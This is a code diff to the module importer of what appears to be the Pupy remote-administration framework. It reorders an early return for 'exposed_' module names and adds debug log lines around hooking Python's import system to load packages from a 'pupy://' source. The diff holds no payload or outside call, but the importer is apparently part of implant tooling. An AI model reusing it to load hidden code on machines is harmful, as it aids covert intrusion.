@@ -408,14 +408,16 @@ class PupyPackageFinder(object):
             raise PupyPackageFinderImportError()
 
     def find_module(self, fullname, path=None, second_pass=False):
+        if fullname.startswith('exposed_'):
+            return None
+
         global modules
         global remote_load_package
 
+        dprint('Find module: {}/{}/{}'.format(fullname, path, second_pass))
+
         imp.acquire_lock()
         selected = None
-
-        if fullname.startswith('exposed_'):
-            return None
 
         try:
             files=[]
@@ -594,9 +596,14 @@ def install(debug=None, trace=False):
     gc.set_threshold(128)
 
     if allow_system_packages:
+        dprint('Install pupyimporter + local packages')
+
         sys.path_hooks.append(PupyPackageFinder)
         sys.path.append('pupy://')
+
     else:
+        dprint('Install pupyimporter - standalone')
+
         sys.meta_path = []
         sys.path = []
         sys.path_hooks = []
@@ -709,3 +716,5 @@ def install(debug=None, trace=False):
     import logging
     logger = logging.getLogger('ppi')
     __dprint_method = logger.debug
+
+    dprint('pupyimporter initialized')
